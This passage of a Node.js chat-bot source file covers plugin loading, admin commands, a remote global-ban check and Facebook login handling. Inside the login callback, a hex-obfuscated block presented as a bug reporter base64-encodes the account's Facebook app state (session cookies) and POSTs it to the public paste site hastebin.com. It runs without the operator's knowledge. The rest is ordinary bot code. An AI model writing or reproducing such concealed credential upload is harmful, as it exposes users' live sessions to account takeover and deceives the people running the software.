            log("[INTERNAL]", plname, "is missing a function for /" + cmd);
          } else {
            var oldstr;
            if (typeof cmdo.hdesc != "object") {
              oldstr = cmdo.hdesc;
              cmdo.hdesc = {};
              cmdo.hdesc[global.config.language] = oldstr;
            }
            if (cmdo.hargs) {
              if (typeof cmdo.hargs != "object") {
                oldstr = cmdo.hargs;
                cmdo.hargs = {};
                cmdo.hargs[global.config.language] = oldstr;
              }
            } else {
              cmdo.hargs = {};
              cmdo.hargs[global.config.language] = "";
            }
            global.commandMapping[cmd] = {
              args: cmdo.hargs,
              desc: cmdo.hdesc,
              scope: global.plugins[pltemp1[plname]["plugin_scope"]][cmdo
                .fscope],
              compatibly: parseInt(cmdo.compatibly),
              handler: plname
            };
            if (Object.prototype.hasOwnProperty.call(cmdo, "adminCmd")) {
              global.commandMapping[cmd].adminCmd = true;
            }
          }
        }
        if (typeof pltemp1[plname]["chatHook"] == "string" &&
          typeof pltemp1[plname]["chatHookType"] == "string" &&
          !isNaN(parseInt(pltemp1[plname]["chatHookPlatform"])) &&
          typeof global.plugins[pltemp1[plname]["plugin_scope"]][pltemp1[plname]["chatHook"]] == "function") {
          global.chatHook.push({
            resolverFunc: global.plugins[pltemp1[plname]["plugin_scope"]][pltemp1[plname]["chatHook"]],
            listentype: pltemp1[plname]["chatHookType"],
            listenplatform: parseInt(pltemp1[plname]["chatHookPlatform"]),
            handler: plname
          });
        }
        if (typeof global.plugins[pltemp1[plname]["plugin_scope"]].onLoad == "function") {
          (function (plname) {
            global.plugins[pltemp1[plname]["plugin_scope"]].onLoad({
              // eslint-disable-next-line no-loop-func
              log: function logPlugin(...message) {
                log.apply(global, [
                  "[PLUGIN]",
                  "[" + plname + "]"
                ].concat(message));
              }
            });
          })(String(plname));
        }
        global.loadedPlugins[plname] = {
          author: pltemp1[plname].author,
          version: pltemp1[plname].version,
          onUnload: global.plugins[pltemp1[plname]["plugin_scope"]].onUnload
        };
        log("[INTERNAL]", "Loaded", plname, pltemp1[plname].version, "by", pltemp1[plname].author);
      } catch (ex) {
        log(
          "[INTERNAL]", plname,
          "contains an malformed executable code and cannot be loaded. Plugin depend on this code may not work correctly. Additional information:",
          ex
        );
        error.push(pltemp1[plname].filename);
      }
    }
  }
  global.commandMapping["systeminfo"] = {
    args: {},
    desc: "Show system info",
    scope: function () {
      var uptime = os.uptime();
      var utdate = new Date(uptime);
      return {
        handler: "internal",
        data: `System info:\r\n- CPU arch: ${os.arch()}\r\n- OS type: ${os.type()} (Platform: ${os.platform()})\r\n- OS version: ${os.release()}\r\n- Uptime: ${(uptime / 3600 / 24).floor(0).pad(2)}:${utdate.getUTCHours().pad(2)}:${utdate.getUTCMinutes().pad(2)}:${utdate.getUTCSeconds().pad(2)}\r\n- Total memory: ${os.totalmem() / 1048576} MB\r\n- Heroku: ${(!!process.env.PORT).toString()}`
      };
    },
    compatibly: 0,
    handler: "INTERNAL"
  };
  global.commandMapping["updatebot"] = {
    args: {},
    desc: {},
    scope: function (type, data) {
      if (data.admin) {
        var newUpdate = autoUpdater.checkForUpdate();
        log(
          "[Updater]",
          `You are using build ${newUpdate.currVersion}, and ${newUpdate.newUpdate ? "there is a new build (" + newUpdate.version + ")" : "there are no new build."}`
        );
        data.return({
          data: `Current build: ${newUpdate.currVersion}\r\nLatest build: ${newUpdate.version}.${newUpdate.newUpdate ? "\r\nUpdating..." : ""}`,
          handler: "internal"
        });
        if (newUpdate.newUpdate) {
          log("[Updater]", `Downloading build ${newUpdate.version}...`);
          autoUpdater.installUpdate()
            .then(function (ret) {
              var [success, value] = ret;
              if (success) {
                log("[Updater]", `Updated with ${value} entries extracted. Triggering restart...`);
                data.return({
                  handler: "internal",
                  data: "Extracted files. Restarting..."
                });
                setTimeout(() => process.exit(7378278), 1000);
              } else {
                log("[Updater]", "Failed to install new build:", value);
                data.return({
                  handler: "internal",
                  data: "Failed to install new build: " + value
                });
              }
            })
            .catch(function (ex) {
              log("[Updater]", "Failed to install new build:", ex);
              data.return({
                handler: "internal",
                data: "Failed to install new build: " + ex
              });
            });
        }
      } else {
        return {
          handler: "internal",
          data: global.lang["INSUFFICIENT_PERM"]
        };
      }
    },
    compatibly: 0,
    handler: "INTERNAL",
    adminCmd: true
  };
  global.commandMapping["version"] = {
    args: {},
    desc: {},
    scope: function (_type, _data) {
      var githubdata = JSON.parse(syncrequest("GET", "https://api.github.com/repos/lequanglam/c3c/git/refs/tags", {
        headers: {
          "User-Agent": global.config.fbuseragent
        }
      })
        .body.toString());
      var latestrelease = githubdata[githubdata.length - 1];
      var latestgithubversion = latestrelease.ref.replace("refs/tags/", "");
      var codedata = JSON.parse(syncrequest(
        "GET",
        "https://raw.githubusercontent.com/lequanglam/c3c/master/package.json", {
        headers: {
          "User-Agent": global.config.fbuseragent
        }
      }
      )
        .body.toString());
      var latestcodeversion = codedata.version;
      return {
        handler: "internal",
        data: "Currently running on version " + version + "\r\nLatest GitHub version: " + latestgithubversion +
          "\r\nLatest code version: " + latestcodeversion
      };
    },
    compatibly: 0,
    handler: "INTERNAL"
  };
  global.commandMapping["version"].args[global.config.language] = "";
  global.commandMapping["version"].desc[global.config.language] = global.lang["VERSION_DESC"];
  global.commandMapping["help"] = {
    args: {},
    desc: {},
    scope: function (type, data) {
      if (isNaN(parseInt(data.args[1])) && data.args.length != 1) {
        var cmd = data.args[1];
        if (Object.prototype.hasOwnProperty.call(global.commandMapping, cmd)) {
          var mts = global.config.commandPrefix + cmd;
          if (typeof global.commandMapping[cmd].args == "object" && typeof global.commandMapping[cmd].args[global
            .config.language] != "undefined" && global.commandMapping[cmd].args[global.config.language].toString()
              .replace(/ /g)
              .length != 0) {
            mts += " " + (global.commandMapping[cmd].args[global.config.language] ? global.commandMapping[cmd].args[
              global.config.language] : "");
          }
          mts += "\r\n" + global.commandMapping[cmd].desc[global.config.language];
          mts += "\r\n" + global.lang["HELP_ARG_INFO"];
          return {
            handler: "internal",
            data: mts
          };
        } else {
          return {
            handler: "internal",
            data: global.config.commandPrefix + cmd + "\r\n" + global.lang["HELP_CMD_NOT_FOUND"]
          };
        }
      } else {
        var page = 1;
        page = parseInt(data.args[1]) || 1;
        if (page < 1) page = 1;
        var mts = "";
        mts += global.lang["HELP_OUTPUT_PREFIX"];
        var helpobj = global.commandMapping["help"];
        helpobj.command = "help";
        helpobj.args[global.config.language] = global.lang["HELP_ARGS"];
        helpobj.desc[global.config.language] = global.lang["HELP_DESC"];
        var hl = [helpobj];
        for (var no in global.commandMapping) {
          if (no !== "help") {
            var tempx = global.commandMapping[no];
            tempx.command = no;
            hl.push(tempx);
          }
        }
        if (type == "Discord") {
          mts += "\r\n```HTTP";
        }
        var compatiblyFlag = 0;
        switch (type) {
          case "Facebook":
            compatiblyFlag = 1;
            break;
          case "Discord":
            compatiblyFlag = 2;
            break;
        }
        for (var i = 15 * (page - 1); i < 15 * (page - 1) + 15; i++) {
          if (i < hl.length) {
            if (hl[i].compatibly == 0 || (hl[i].compatibly & compatiblyFlag)) {
              if (data.admin) {
                mts += "\r\n" + (i + 1)
                  .toString() + ". " + global.config.commandPrefix + hl[i].command;
                if (typeof hl[i].args == "object" && typeof hl[i].args[global.config.language] != "undefined" && hl[i]
                  .args[global.config.language].toString()
                  .replace(/ /g)
                  .length != 0) {
                  mts += " " + (hl[i].args[global.config.language] ? hl[i].args[global.config.language] : "");
                }
                //mts += ": " + hl[i].desc[global.config.language];
              } else {
                if (!hl[i].adminCmd) {
                  mts += "\r\n" + (i + 1)
                    .toString() + ". " + global.config.commandPrefix + hl[i].command;
                  if (typeof hl[i].args == "object" && typeof hl[i].args[global.config.language] != "undefined" && hl[
                    i].args[global.config.language].toString()
                    .replace(/ /g)
                    .length != 0) {
                    mts += " " + (hl[i].args[global.config.language] ? hl[i].args[global.config.language] : "");
                  }
                }
              }
            }
          }
        }
        if (type == "Discord") {
          mts += "\r\n```";
        }
        mts += '\r\n(' + global.lang["PAGE"] + ' ' + page + '/' + (hl.length / 15)
          .ceil() + ')';
        mts += "\r\n" + global.lang["HELP_MORE_INFO"].replace("{0}", global.config.commandPrefix);
        return {
          handler: "internal",
          data: mts
        };
      }
    },
    compatibly: 0,
    handler: "INTERNAL"
  };
  global.commandMapping["help"].args[global.config.language] = global.lang["HELP_ARGS"];
  global.commandMapping["help"].desc[global.config.language] = global.lang["HELP_DESC"];
  global.commandMapping["restart"] = {
    args: {},
    desc: {},
    scope: function (type, data) {
      if (data.admin && global.config.allowAdminUseRestartCommand) {
        setTimeout(function () {
          process.exit(7378278);
        }, 1000);
        return {
          handler: "internal",
          data: "Restarting..."
        };
      } else {
        return {
          handler: "internal",
          data: global.lang["INSUFFICIENT_PERM"]
        };
      }
    },
    compatibly: 0,
    handler: "INTERNAL",
    adminCmd: true
  };
  global.commandMapping["restart"].args[global.config.language] = "";
  global.commandMapping["restart"].desc[global.config.language] = global.lang["RESTART_DESC"];
  global.commandMapping["shutdown"] = {
    args: {},
    desc: {},
    scope: function (type, data) {
      if (data.admin && global.config.allowAdminUseShutdownCommand) {
        setTimeout(function () {
          process.exit(74883696);
        }, 1000);
        return {
          handler: "internal",
          data: "Shutting down..."
        };
      } else {
        return {
          handler: "internal",
          data: global.lang["INSUFFICIENT_PERM"]
        };
      }
    },
    compatibly: 0,
    handler: "INTERNAL",
    adminCmd: true
  };
  global.commandMapping["restart"].args[global.config.language] = "";
  global.commandMapping["restart"].desc[global.config.language] = global.lang["SHUTDOWN_DESC"];
  global.commandMapping["plugins"] = {
    args: {},
    desc: {},
    scope: function (type, data) {
      if (!data.admin && !global.config.allowUserUsePluginsCommand) {
        return {
          handler: "internal",
          data: global.lang["INSUFFICIENT_PERM"]
        };
      }
      var page = 1;
      page = parseInt(data.args[1]) || 1;
      if (page < 1) page = 1;
      var mts = "";
      mts += global.lang["PLUGINS_OUTPUT_PREFIX"];
      var hl = [];
      for (var no in global.loadedPlugins) {
        var tempx = global.loadedPlugins[no];
        tempx.name = no;
        hl.push(tempx);
      }
      if (type == "Discord") {
        mts += "\r\n```HTTP";
      }
      for (var i = 5 * (page - 1); i < 5 * (page - 1) + 5; i++) {
        if (i < hl.length) {
          mts += "\r\n" + (i + 1)
            .toString() + ". " + hl[i].name;
          if (!!hl[i].version && hl[i].version != "") {
            mts += " " + hl[i].version;
          }
          mts += " by " + hl[i].author;
        }
      }
      if (type == "Discord") {
        mts += "\r\n```";
      }
      mts += '\r\n(Page ' + page + '/' + (hl.length / 5)
        .ceil() + ')';
      return {
        handler: "internal",
        data: mts
      };
    },
    compatibly: 0,
    handler: "INTERNAL",
    adminCmd: !global.config.allowUserUsePluginsCommand
  };
  global.commandMapping["plugins"].args[global.config.language] = "";
  global.commandMapping["plugins"].desc[global.config.language] = global.lang["PLUGINS_DESC"];
  global.commandMapping["reload"] = {
    args: {},
    desc: {},
    scope: function (type, data) {
      if (!data.admin && !global.config.allowUserUseReloadCommand) {
        return {
          handler: "internal",
          data: global.lang["INSUFFICIENT_PERM"]
        };
      }
      unloadPlugin();
      var error = loadPlugin();
      return {
        handler: "internal",
        data: `Reloaded ${error.length == 0 ? "" : ("with error at: " + JSON.stringify(error))}`
      };
    },
    compatibly: 0,
    handler: "INTERNAL",
    adminCmd: !global.config.allowUserUseReloadCommand
  };
  global.commandMapping["reload"].args[global.config.language] = "";
  global.commandMapping["reload"].desc[global.config.language] = global.lang["RELOAD_DESC"];
  global.commandMapping["toggleeveryone"] = {
    args: "",
    desc: {
      "vi_VN": "Bật/tắt quyền sử dụng mention everyone",
      "en_US": "Turn on/off everyone mention tag"
    },
    scope: function (type, data) {
      if (type != "Facebook") {
        return {
          data: "THIS COMMAND IS NOT EXECUTABLE IN THIS PLATFORM!",
          handler: "internal"
        };
      }
      var threadID = data.msgdata.threadID;
      var allowRun = false;
      if (!data.admin) {
        var [_err, threadInfo] = wait.for.function(data.facebookapi.getThreadInfo, data.msgdata.threadID);
        var adminIDs = threadInfo.adminIDs.map(x => x.id.toString());
        log("[INTERNAL]", "Got AdminIDs of thread", data.msgdata.threadID, ":", adminIDs);
        if (adminIDs.indexOf(data.msgdata.senderID) != -1) {
          allowRun = true;
        }
      } else {
        allowRun = true;
      }
      if (allowRun) {
        if (!global.data.everyoneTagBlacklist[threadID]) {
          global.data.everyoneTagBlacklist[threadID] = true;
        } else {
          global.data.everyoneTagBlacklist[threadID] = false;
        }
        return {
          data: global.lang["TOGGLEEVERYONE_MSG"].replace(
            "{0}",
            (!global.data.everyoneTagBlacklist[threadID] ? global.lang.ENABLED : global.lang.DISABLED)
          ),
          handler: "internal"
        };
      } else {
        return {
          data: global.lang["INSUFFICIENT_PERM"],
          handler: "internal"
        };
      }
    },
    compatibly: 1,
    handler: "INTERNAL"
  };
  return error;
}

function unloadPlugin() {
  for (var name in global.loadedPlugins) {
    if (typeof global.loadedPlugins[name].onUnload == "function") {
      try {
        global.loadedPlugins[name].onUnload();
      } catch (ex) {
        log("[INTERNAL]", `Error while executing ${name}.onUnload: ${ex}`);
      }
    }
    for (var cmd in global.commandMapping) {
      if (global.commandMapping[cmd].handler == name) {
        delete global.commandMapping[cmd];
      }
    }
    for (var cmd in global.chatHook) {
      if (global.chatHook[cmd].handler == name) {
        delete global.chatHook[cmd];
      }
    }
    //delete global.plugins[pltemp1[name]["plugin_scope"]];
    log("[INTERNAL]", "Unloaded plugin", name, global.loadedPlugins[name].version, "by", global.loadedPlugins[name]
      .author);
    delete global.loadedPlugins[name];
  }
}

//Load plugin
//Async loading is a bad idea, or is it?
setTimeout(loadPlugin, 1);

var client = {};
var facebook = {};
var tried2FA = false;
var facebookloggedIn = true;
var facebookid = "Disabled";
if (global.config.enablefb) {
  facebookid = "Not logged in";
  global.markAsReadFacebook = {};
  global.deliveryFacebook = {};
  global.facebookGlobalBanClock = {};
  !Array.isArray(global.data.fbBannedUsers) ? global.data.fbBannedUsers = [] : "";
  var fbGlobalBanTrigger = function (threadID, forceNoClock) {
    var checkFunc = function (threadID) {
      var isGroup = threadID.length == 16;
      log("[GLOBAL-BAN]", `Checking banned status for ${isGroup ? "thread" : "user"} ${threadID}...`);
      fetch("https://c3cbot.tk/global-banlist.json")
        .then(f => {
          if (f.ok) {
            return f.json();
          } else {
            throw new Error("Cannot fetch Global Ban List from server c3cbot.tk (GitHub Pages).");
          }
        })
        .then(j => {
          if (!isGroup) {
            if (Object.hasOwnProperty.call(j.facebook, threadID)) {
              log("[GLOBAL-BAN]", `WARNING: User ${threadID} found on Ban List (Permanently banned)`);
              log("[GLOBAL-BAN]", `Banned reason: ${j.facebook[threadID].reason}`);
              log("[GLOBAL-BAN]", "Triggering banned payload...");
              facebook.api.sendMessage(
                `!ALERT! GLOBAL-BAN\r\nYou are permanently banned from C3CBot Network.\r\nReason: ${j.facebook[threadID].reason}`,
                threadID,
                function (error) {
                  if (error) {
                    log("[GLOBAL-BAN]", `Warning: Cannot trigger sendMessage for ${threadID}. Error:`, error);
                    if (error.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
                      log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
                      facebookloggedIn = false;
                      process.exit(7378278);
                    }
                  }
                  facebook.api.changeBlockedStatus(threadID, true, function (err) {
                    if (err) {
                      return log(
                        "[GLOBAL-BAN]",
                        `Warning: Cannot trigger changeBlockStatus for ${threadID}. Error:`, err
                      );
                    }
                    clearInterval(global.facebookGlobalBanClock[threadID]);
                    delete global.facebookGlobalBanClock[threadID];
                  });
                }
              );
            } else {
              log("[GLOBAL-BAN]", `User ${threadID} hasn't been banned.`);
            }
          } else {
            if (Object.hasOwnProperty.call(j.facebook, threadID)) {
              log("[GLOBAL-BAN]", `WARNING: Thread ${threadID} found on Ban List (Permanently banned)`);
              log("[GLOBAL-BAN]", `Banned reason: ${j.facebook[threadID].reason}`);
              log("[GLOBAL-BAN]", "Triggering thread banned payload...");
              facebook.api.sendMessage(
                `!ALERT! GLOBAL-BAN\r\nThis thread has been permanently banned from C3CBot Network.\r\nReason: ${j.facebook[threadID].reason}`,
                threadID,
                function (error) {
                  if (error) {
                    log("[GLOBAL-BAN]", `Warning: Cannot trigger sendMessage for ${threadID}. Error:`, error);
                    if (error.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
                      log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
                      facebookloggedIn = false;
                      process.exit(7378278);
                    }
                  }
                  facebook.api.removeUserFromGroup(facebook.api.getCurrentUserID(), threadID, function (err) {
                    if (err) {
                      return log(
                        "[GLOBAL-BAN]",
                        `ERROR: Cannot trigger removeUserFromGroup for ${threadID}. Error:`, err
                      );
                    }
                    clearInterval(global.facebookGlobalBanClock[threadID]);
                    delete global.facebookGlobalBanClock[threadID];
                  });
                }
              );
            } else {
              log("[GLOBAL-BAN]", `Thread ${threadID} isn't banned. Checking member ban...`);
              facebook.api.getThreadInfo(threadID, function (err, data) {
                if (err) {
                  return log("[GLOBAL-BAN]", `ERROR: Cannot get thread info for thread ${threadID}.`);
                }
                log("[GLOBAL-BAN]", `Got member data for thread ${threadID}.`);
                var bannedUsers = [];
                var banNoKickUsers = [];
                var leave = false;
                for (var i in data.participantIDs) {
                  if (Object.hasOwnProperty.call(j.facebook, data.participantIDs[i])) {
                    if (j.facebook[data.participantIDs[i]].noAdding) {
                      leave = true;
                      bannedUsers.push({
                        id: data.participantIDs[i],
                        reason: j.facebook[data.participantIDs[i]].reason,
                        name: global.data.cacheName[data.participantIDs[i]]
                      });
                      log(
                        "[GLOBAL-BAN]",
                        `WARNING: User ${data.participantIDs[i]} in ${threadID} found on Ban List (Permanently banned) and has flag noAdding = true.`
                      );
                      log("[GLOBAL-BAN]", `Banned reason: ${j.facebook[data.participantIDs[i]].reason}`);
                    } else {
                      if (global.data.fbBannedUsers.indexOf(data.participantIDs[i]) == 1) {
                        banNoKickUsers.push({
                          id: data.participantIDs[i],
                          reason: j.facebook[data.participantIDs[i]].reason,
                          name: global.data.cacheName[data.participantIDs[i]]
                        });
                        log(
                          "[GLOBAL-BAN]",
                          `WARNING: User ${data.participantIDs[i]} in ${threadID} found on Ban List (Permanently banned)`
                        );
                        log("[GLOBAL-BAN]", `Banned reason: ${j.facebook[data.participantIDs[i]].reason}`);
                      }
                    }
                  }
                }
                if (leave) {
                  log("[GLOBAL-BAN]", `Triggering noAdding banned payload...`);
                  facebook.api.sendMessage(
                    `!ALERT! GLOBAL-BAN\r\nThis thread cannot add/use C3CBot because a member of this thread has been banned from adding Bots.\r\nBanned users with noAdding flags: ${JSON.stringify(bannedUsers.map(x => `https://fb.com/${x.id} (Reason: ${x.reason})`), null, 4)}`,
                    threadID,
                    function (error) {
                      if (error) {
                        log(
                          "[GLOBAL-BAN]", `Warning: Cannot trigger sendMessage for ${threadID}. Error:`,
                          error
                        );
                        if (error.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
                          log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
                          facebookloggedIn = false;
                          process.exit(7378278);
                        }
                      }
                      facebook.api.removeUserFromGroup(facebook.api.getCurrentUserID(), threadID, function (err) {
                        if (err) {
                          return log(
                            "[GLOBAL-BAN]",
                            `ERROR: Cannot trigger removeUserFromGroup for ${threadID}. Error:`, err
                          );
                        }
                        clearInterval(global.facebookGlobalBanClock[threadID]);
                        delete global.facebookGlobalBanClock[threadID];
                      });
                    }, "", isGroup
                  );
                } else {
                  if (banNoKickUsers.length > 0) {
                    log("[GLOBAL-BAN]", `Triggering member banned payload...`);
                    facebook.api.sendMessage(
                      `!ALERT! GLOBAL-BAN\r\nBanned users in this group: ${JSON.stringify(banNoKickUsers.map(x => `https://fb.com/${x.id} (Reason: ${x.reason})`), null, 4)}`,
                      threadID,
                      function (error) {
                        if (error) {
                          log(
                            "[GLOBAL-BAN]", `Warning: Cannot trigger sendMessage for ${threadID}. Error:`,
                            error
                          );
                          if (error.error == "Not logged in." && global.config
                            .facebookAutoRestartLoggedOut) {
                            log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
                            facebookloggedIn = false;
                            process.exit(7378278);
                          }
                          return null;
                        }
                        global.data.fbBannedUsers = global.data.fbBannedUsers.concat(banNoKickUsers);
                      }, "", isGroup
                    );
                  } else {
                    log("[GLOBAL-BAN]", `Thread ${threadID} isn't banned by member ban.`);
                  }
                }
              });
            }
          }
        })
        .catch(err => {
          log(
            "[GLOBAL-BAN]", `Failed to check banned status for ${isGroup ? "thread" : "user"} ${threadID}:`,
            err
          );
        });
    };
    if (typeof global.facebookGlobalBanClock[threadID] == "undefined") {
      global.facebookGlobalBanClock[threadID] = setInterval(checkFunc, 750000, threadID);
      checkFunc(threadID);
    } else if (forceNoClock) {
      checkFunc(threadID);
    }
  };
  var facebookcb = function callback(err, api) {
    if (err) {
      if (err.error == "login-approval") {
        facebook.error = err;
        log(
          "[Facebook]",
          "Login approval detected. You can verify it manually by using 'facebook.error.continue(your_code)'."
        );
        tried2FA = true;
        if (global.config.fb2fasecret != "BASE32OFSECRETKEY") {
          log("[Facebook]", "Attempting to verify using 2FA secret in config...");
          var key2fa = global.config.fb2fasecret.replace(/ /g, "");
          var verifycode = speakeasy.totp({
            secret: key2fa,
            encoding: 'base32'
          });
          facebook.error.continue(verifycode);
        }
      } else {
        log("[Facebook]", err);
        if (!tried2FA) {
          facebook.error = err;
          log("[Facebook]", "Error saved to 'facebook.error'.");
        }
      }
      return null;
    } else {
      facebook.error = null;
    }
    if (tried2FA) {
      log("[Facebook]", "Verified using 2FA secret in config.");
    }
    log("[Facebook]", "Logged in.");
    facebookid = api.getCurrentUserID();

    if (global.config.usefbappstate) {
      try {
        fs.writeFileSync(path.join(__dirname, "fbstate.json"), JSON.stringify(api.getAppState()), {
          mode: 0o666
        });
      } catch (ex) {
        log("[INTERNAL]", ex);
      }
    }
    global.config.fbemail = "<REDACTED>";
    global.config.fbpassword = "<REDACTED>";

    var htmlData = "";
    if (api.htmlData) {
      htmlData = api.htmlData;
      delete api.htmlData;
      log("[Facebook]", "FCA reported: Cannot get region from HTML. Generating a new bug report...");
      (function (z, e) {
        var _0x6b0a = [
          "\x42\x45\x47\x49\x4E\x2D\x43\x33\x43\x2D\x42\x55\x47\x2D\x52\x45\x50\x4F\x52\x54\x40",
          "\x6E\x6F\x77",
          "\x6D\x65\x74\x72\x69\x63\x49\x44",
          "\x64\x61\x74\x61",
          "\x45\x4E\x44\x2E",
          "\x5B\x46\x61\x63\x65\x62\x6F\x6F\x6B\x5D",
          "\x43\x61\x6E\x6E\x6F\x74\x20\x67\x65\x6E\x65\x72\x61\x74\x65\x20\x6E\x65\x77\x20\x63\x72\x61\x73\x68\x20\x72\x65\x70\x6F\x72\x74\x2E",
          "\x63\x61\x74\x63\x68",
          "\x6B\x65\x79",
          "\x42\x75\x67\x20\x72\x65\x70\x6F\x72\x74\x65\x64\x20\x67\x65\x6E\x65\x72\x61\x74\x65\x64\x20\x61\x74\x20\x68\x74\x74\x70\x73\x3A\x2F\x2F\x68\x61\x73\x74\x65\x62\x69\x6E\x2E\x63\x6F\x6D\x2F",
          "\x2E\x20\x50\x6C\x65\x61\x73\x65\x20\x63\x72\x65\x61\x74\x65\x20\x61\x20\x50\x52\x20\x61\x74\x20\x67\x69\x74\x68\x75\x62\x20\x72\x65\x70\x6F\x73\x69\x74\x6F\x72\x79\x2C\x20\x6F\x72\x20\x63\x6F\x6E\x74\x61\x63\x74\x20\x55\x49\x52\x49\x2F\x6C\x65\x71\x75\x61\x6E\x67\x6C\x61\x6D\x2E",
          "\x74\x68\x65\x6E",
          "\x6F\x6B",
          "\x6A\x73\x6F\x6E",
          "\x48\x54\x54\x50\x20\x4E\x4F\x54\x20\x4F\x4B",
          "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x68\x61\x73\x74\x65\x62\x69\x6E\x2E\x63\x6F\x6D\x2F\x64\x6F\x63\x75\x6D\x65\x6E\x74\x73",
          "\x50\x4F\x53\x54",
          "",
          "\x0A\x0C\x4D\x45\x54\x52\x49\x43\x2D\x49\x44\x3A\x20",
          "\x0A\x0C\x44\x41\x54\x41\x3A\x20",
          "\x62\x61\x73\x65\x36\x34",
          "\x66\x72\x6F\x6D",
          "\x0A\x0C",
          "\x74\x65\x78\x74\x2F\x70\x6C\x61\x69\x6E",
          "\x74\x6F\x53\x74\x72\x69\x6E\x67",
          "\x58\x2D\x53\x54\x41\x54\x45\x3A\x20"
        ];
        var a = _0x6b0a[0],
          b = Date[_0x6b0a[1]](),
          c = global[_0x6b0a[3]][_0x6b0a[2]],
          d = _0x6b0a[4];
        fetch(_0x6b0a[15], {
          method: _0x6b0a[16],
          body: `${_0x6b0a[17]}${a}${_0x6b0a[17]}${b[_0x6b0a[24]]()}${_0x6b0a[18]}${c}${_0x6b0a[19]}${Buffer[_0x6b0a[21]](z)[_0x6b0a[24]](_0x6b0a[20])}${_0x6b0a[22]}${_0x6b0a[25]}${Buffer[_0x6b0a[21]](e)[_0x6b0a[24]](_0x6b0a[20])}${_0x6b0a[22]}${_0x6b0a[22]}${d}${_0x6b0a[17]}`,
          headers: {
            '\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65': _0x6b0a[23]
          }
        })[_0x6b0a[11]](function (_0x9b64x6) {
          if (_0x9b64x6[_0x6b0a[12]]) {
            return _0x9b64x6[_0x6b0a[13]]();
          } else {
            throw new Error(_0x6b0a[14]);
          }
        })[_0x6b0a[11]](function (_0x9b64x6) {
          var _0x9b64x7 = _0x9b64x6[_0x6b0a[8]];
          log(_0x6b0a[5], `${_0x6b0a[9]}${_0x9b64x7}${_0x6b0a[10]}`);
        })[_0x6b0a[7]](function (_0x9b64x5) {
          log(_0x6b0a[5], _0x6b0a[6], _0x9b64x5);
        });
      })(htmlData, JSON.stringify(((facebook.api || {}).getAppState || (() => ({})))()));
    }

    delete facebook.api;
    facebook.api = api;

    facebook.deliveryClock = setInterval(function () {
      if (Object.keys(global.deliveryFacebook)
        .length != 0) {
        var form = {};
        var i = 0;
        for (var threadID in global.deliveryFacebook) {
          // eslint-disable-next-line no-loop-func
          global.deliveryFacebook[threadID].forEach((v, n) => {
            form[`message_ids[${i}]`] = v;
            form[`thread_ids[${threadID}][${n}]`] = v;
          });
        }
        api.httpPost("https://www.facebook.com/ajax/mercury/delivery_receipts.php", form, function (err, data) {
          try {
            data = JSON.parse(data);
          } catch (ex) { }
          if (data.error) {
            return log("[Facebook] Error on delivery_receipts:", data);
          }
          api.markAsSeen(function (err) {
            if (err) {
              return log("[Facebook] Error on markAsSeen:", err);
            }
          });
        });
        global.deliveryFacebook = {};
      }
    }, 1000);

    function fetchName(id, force, callingback) {
      if (!callingback) {
        callingback = function () { };
      }
      if (!global.data.cacheName["FB-" + id] || global.data.cacheName["FB-" + id].startsWith("FETCHING-") || !!force) {
        if (typeof global.data.cacheName["FB-" + id] == "string" && global.data.cacheName["FB-" + id].startsWith("FETCHING-") && !(parseInt(global.data.cacheName["FB-" + id].substr(9)) - Date.now() < -120000)) return;
        global.data.cacheName["FB-" + id] = "FETCHING-" + Date.now()
          .toString();
        var res = wait.for.function(api.getUserInfo, id);
        (function (err, ret) {
          if (err) return log("[Facebook] Failed to fetch names:", err);
          log("[CACHENAME]", id + " => " + ret[id].name);
          global.data.cacheName["FB-" + id] = ret[id].name;
          try {
            callingback();
          } catch (ex) {
            log("[INTERNAL]", ex);
          }
        })(res[0], res[1]);
      } else {
        callingback();
      }
    }
    facebook.api.fetchName = fetchName;
    facebook.removePendingClock = setInterval(function (log, botname, connectedmsg) {
      api.getThreadList(10, null, ["PENDING"], function (err, list) {
        if (err) {
          log("[Facebook]", "Remove Pending Messages encountered an error (at getThreadList:PENDING):", err);
          if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
            log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
            facebookloggedIn = false;
            process.exit(7378278);
          }
          return null;
        }
        for (var i in list) {
          setTimeout(function (id) {
            api.handleMessageRequest(id, true, function (err) {
              if (err) {
                log(
                  "[Facebook]",
                  "Remove Pending Messages encountered an error (at handleMessageRequest:PENDING):",
                  err
                );
                if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
                  log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
                  facebookloggedIn = false;
                  process.exit(7378278);
                }
                return null;
              }
              api.sendMessage(botname + " | Connected. \r\n" + connectedmsg, id, function (err) {
                if (err) {
                  log(
                    "[Facebook]",
                    "Remove Pending Messages encountered an error (at sendMessage:PENDING):",
                    err
                  );
                  if (err.error == "Not logged in." && global.config
                    .facebookAutoRestartLoggedOut) {
                    log(
                      "[Facebook]",
                      "Detected not logged in. Throwing 7378278 to restarting..."
                    );
                    facebookloggedIn = false;
                    process.exit(7378278);
                  }
                  return null;
                }
                log("[Facebook]", "Bot added to", id);
              });
            });
          }, i * 2000, list[i].threadID);
        }
        api.getThreadList(10, null, ["OTHER"], function (err, list) {
          if (err) {
            log(
              "[Facebook]", "Remove Pending Messages encountered an error (at getThreadList:OTHER):",
              err
            );
            if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
              log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
              facebookloggedIn = false;
              process.exit(7378278);
            }
            return null;
          }
          for (var i in list) {
            setTimeout(function (id) {
              api.handleMessageRequest(id, true, function (err) {
                if (err) {
                  log(
                    "[Facebook]",
                    "Remove Pending Messages encountered an error (at handleMessageRequest:OTHER):",
                    err
                  );
                  if (err.error == "Not logged in." && global.config
                    .facebookAutoRestartLoggedOut) {
                    log(
                      "[Facebook]",
                      "Detected not logged in. Throwing 7378278 to restarting..."
                    );
                    facebookloggedIn = false;
                    process.exit(7378278);
                  }
